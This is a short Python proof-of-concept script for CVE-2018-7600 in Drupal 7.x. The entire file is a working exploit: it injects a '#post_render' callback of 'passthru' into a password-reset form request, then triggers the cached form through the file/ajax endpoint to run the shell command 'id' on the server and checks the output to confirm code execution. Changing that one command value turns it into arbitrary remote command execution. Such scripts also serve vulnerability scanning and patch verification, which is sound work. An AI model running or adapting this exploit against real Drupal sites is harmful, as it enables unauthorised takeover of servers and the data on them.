#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""PoC of CVE-2018-7600
"""

import re
import requests


class Exploit(object):

    def __init__(self):
        """init
        """
        super(Exploit, self).__init__()

    def poc(self, url):

        # PoC for Drupal 7.x
        params = {
            'q': 'user/password',
            'name[#post_render][]': 'passthru',
            'name[#markup]': 'id',
            'name[#type]': 'markup'
        }

        data = {
            'form_id': 'user_pass',
            '_triggering_element_name': 'name'
        }

        r = requests.post(url, data=data, params=params)

        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
        if m:
            found = m.group(1)
            params = {'q': 'file/ajax/name/#value/' + found}
            data = {'form_build_id': found}
            r = requests.post(url, data=data, params=params)
            if "uid" in r.text:
                return True
        return False


if __name__ == '__main__':
    e = Exploit()
    e.poc("http://127.0.0.1")
